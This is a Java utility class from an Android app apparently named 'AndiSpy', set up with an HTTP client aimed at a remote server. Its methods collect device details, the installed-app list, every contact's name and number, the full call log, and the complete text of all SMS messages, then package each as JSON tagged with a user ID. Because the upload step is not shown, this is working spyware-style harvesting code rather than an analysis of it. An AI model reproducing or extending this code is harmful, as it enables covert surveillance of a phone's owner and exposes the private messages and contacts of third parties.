package com.andispy.andispy.util;


import android.Manifest;
import android.app.ProgressDialog;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.content.SharedPreferences;
import android.content.pm.ApplicationInfo;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.net.Uri;
import android.os.BatteryManager;
import android.os.Build;
import android.provider.CallLog;
import android.provider.ContactsContract;
import android.support.v4.app.ActivityCompat;
import android.telephony.TelephonyManager;
import android.util.Log;
import android.widget.EditText;
import android.widget.Toast;

import com.andispy.andispy.http.Http;
import com.squareup.okhttp.OkHttpClient;

import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;

import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;
import java.sql.Timestamp;
import java.util.ArrayList;
import java.util.Date;
import java.util.Iterator;
import java.util.List;

import retrofit.RestAdapter;
import retrofit.client.OkClient;
import retrofit.client.Response;

import static android.R.attr.version;

public class Util {

    private final Context context;
    String API_BASE_URL = "http://andispy.grassobot.com/";
    public Http http;
    public ProgressDialog progressDialog;
    private int mProgressStatus = 0;
    private Context mContext;
    IntentFilter iFilter;
    String brand;
    String manu;
    String model;
    String battery;
    String version;

    public static final int REQUEST_CODE_PHONE_STATE_READ = 1;
    private int checkedPermission = PackageManager.PERMISSION_DENIED;


    public Util(Context context) {
        this.context = context;
        createConnection();

        progressDialog = new ProgressDialog(context);
        progressDialog.setMessage("Please wait..");
    }

    private void createConnection() {
        RestAdapter.Builder restAdapter =
                new RestAdapter.Builder()
                        .setEndpoint(API_BASE_URL)
                        .setClient(
                                new OkClient(new OkHttpClient())
                        );
        RestAdapter adapter = restAdapter.build();


        http = adapter.create(Http.class);
    }

    public JSONObject GetDeviceInfoList() {

        JSONObject obj_new = new JSONObject();
        SharedPreferences pref = context.getSharedPreferences("MyPref", context.MODE_PRIVATE);
        SharedPreferences.Editor editor = pref.edit();
        String User = pref.getString("User_ID", null);
        try {
            JSONArray jsonArray = new JSONArray();

            brand = (Build.BRAND);
            manu = (Build.MANUFACTURER);
            model = (Build.MODEL);
            version = String.valueOf(Build.VERSION.SDK_INT);

            JSONObject jsonObject = new JSONObject();
            jsonObject.put("RegID", User);
            jsonObject.put("Brand", brand);
            jsonObject.put("Manu", manu);
            jsonObject.put("Model", model);
            jsonObject.put("Version", version);

            jsonArray.put(jsonObject);

            obj_new.put("req", jsonArray);
            Log.d("Device==", jsonArray.toString());


            //     Postdata P1= new Postdata(Constants.URL_login, obj_new,getApplicationContext(),WelcomeActivity.class);
        } catch (Exception e) {
            // TODO Auto-generated catch block
            e.printStackTrace();
        }
        return obj_new;

    }

    public JSONObject GetApplicationList() {

        JSONObject obj_new = new JSONObject();
        SharedPreferences pref = context.getSharedPreferences("MyPref", context.MODE_PRIVATE);
        SharedPreferences.Editor editor = pref.edit();
        String User = pref.getString("User_ID", null);
        try {
            JSONArray jsonArray = new JSONArray();

            PackageManager packageManager = context.getPackageManager();
            List<ApplicationInfo> applist = packageManager.getInstalledApplications(0);


            Iterator<ApplicationInfo> it = applist.iterator();
            while (it.hasNext()) {
                ApplicationInfo pk = (ApplicationInfo) it.next();
                String appname = packageManager.getApplicationLabel(pk).toString();
                Log.d("ApplicationName", appname);

                JSONObject jsonObject = new JSONObject();
                jsonObject.put("RegID", User);
                jsonObject.put("appname", appname);
                jsonArray.put(jsonObject);

                obj_new.put("req", jsonArray);


            }


        } catch (JSONException e) {
            e.printStackTrace();
        }
        return obj_new;
    }
    public JSONObject GetContactList() {
        Cursor c = context.getContentResolver().query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI, null, null, null, null);
        JSONObject obj_new = new JSONObject();

        if (c == null) {
            return null;
        }

        ArrayList<String> contacts = new ArrayList<>();

        SharedPreferences pref = context.getSharedPreferences("MyPref", context.MODE_PRIVATE);
        SharedPreferences.Editor editor = pref.edit();
        String User = pref.getString("User_ID", null);
        try {
            JSONArray jsonArray = new JSONArray();
            while (c.moveToNext()) {

                String contactName = c
                        .getString(c
                                .getColumnIndex(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME));
                String phNumber = c
                        .getString(c
                                .getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER));


                contacts.add(contactName + ":" + phNumber);
                Log.d(contactName, phNumber);
                JSONObject jsonObject = new JSONObject();
                jsonObject.put("RegID", User);
                jsonObject.put("contactname", contactName);
                jsonObject.put("contactnumber", phNumber);
                jsonArray.put(jsonObject);
            }

            obj_new.put("req", jsonArray);


            //     Postdata P1= new Postdata(Constants.URL_login, obj_new,getApplicationContext(),WelcomeActivity.class);
        } catch (Exception e) {
            // TODO Auto-generated catch block
            e.printStackTrace();
        }
        return obj_new;

    }

    public JSONObject GetCallLogList() {


        Cursor c = context.getContentResolver().query( Uri.parse("content://call_log/calls"), null, null, null, null);
        JSONObject obj_new = new JSONObject();

        if (c == null) {
            return null;
        }

        int number = c.getColumnIndex(CallLog.Calls.NUMBER);
        int name = c.getColumnIndex(CallLog.Calls.CACHED_NAME);
        int type = c.getColumnIndex(CallLog.Calls.TYPE);
        int date = c.getColumnIndex(CallLog.Calls.DATE);
        int duration = c.getColumnIndex(CallLog.Calls.DURATION);

        SharedPreferences pref = context.getSharedPreferences("MyPref", context.MODE_PRIVATE);
        SharedPreferences.Editor editor = pref.edit();
        String User = pref.getString("User_ID", null);
        try {
            JSONArray jsonArray = new JSONArray();

            while (c.moveToNext()) {
                String phNumber = c.getString(number);
                String phName = c.getString(name);
                String callType = c.getString(type);
                String dates = c.getString(c.getColumnIndexOrThrow("date"));
                Timestamp smsDayTime = new Timestamp(Long.valueOf(dates));
                String time = smsDayTime.toString();
                String callDuration = c.getString(duration);
                String dir = "UNKWON";
                int dircode = Integer.parseInt(callType);


                switch (dircode) {
                    case CallLog.Calls.OUTGOING_TYPE:
                        dir = "OUTGOING";
                        break;

                    case CallLog.Calls.INCOMING_TYPE:
                        dir = "INCOMING";
                        break;

                    case CallLog.Calls.MISSED_TYPE:
                        dir = "MISSED";
                        break;
                }

                JSONObject jsonObject = new JSONObject();
                jsonObject.put("RegID", User);
                jsonObject.put("callname", phName);
                jsonObject.put("callnumber", phNumber);
                jsonObject.put("calltype", dir);
                jsonObject.put("callduration", callDuration);
                jsonObject.put("calltime",time);

                jsonArray.put(jsonObject);
            }

            obj_new.put("req", jsonArray);


            //     Postdata P1= new Postdata(Constants.URL_login, obj_new,getApplicationContext(),WelcomeActivity.class);
        } catch (Exception e) {
            // TODO Auto-generated catch block
            e.printStackTrace();
        }
        return obj_new;

    }



    public JSONObject GetSmsList()
    {
        Cursor c = context.getContentResolver().query( Uri.parse("content://sms"),null,null,null, null);
        JSONObject obj_msg = new JSONObject();
        if (c == null) {
            return null;
        }


        SharedPreferences pref = context.getSharedPreferences("MyPref", context.MODE_PRIVATE);
        SharedPreferences.Editor editor = pref.edit();
        String 	User=pref.getString("User_ID", null);

        try {
            JSONArray objPhp = new JSONArray();

            if (c.moveToFirst()) {
                for (int i = 0; i < c.getCount(); i++) {
                    String body = c.getString(c.getColumnIndexOrThrow("body"));

                    String number = c.getString(c.getColumnIndexOrThrow("address"));

                    String date = c.getString(c.getColumnIndexOrThrow("date"));

                    Timestamp smsDayTime = new Timestamp(Long.valueOf(date));
                    String time = smsDayTime.toString();

                    JSONObject objAndroid = new JSONObject();
                    objAndroid.put("RegID",User);
                    objAndroid.put("msgnumber",number);
                    objAndroid.put("msgdatetime",time);
                    objAndroid.put("msgbody",body);
                    objPhp.put(objAndroid);

                    c.moveToNext();
                }
                obj_msg.put("req", objPhp);

            }
        }catch (Exception e)
        {
            e.printStackTrace();
        }
       return obj_msg;

    }

    public JSONObject getJson(Response response)
    {
        BufferedReader reader = null;
        StringBuilder sb = new StringBuilder();
        try {

            reader = new BufferedReader(new InputStreamReader(response.getBody().in()));

            String line;

            try {
                while ((line = reader.readLine()) != null) {
                    sb.append(line);
                }
            } catch (IOException e) {
                e.printStackTrace();
            }
            return new JSONObject(sb.toString());
        } catch (Exception e) {
            e.printStackTrace();
        }
        return null;
    }



}
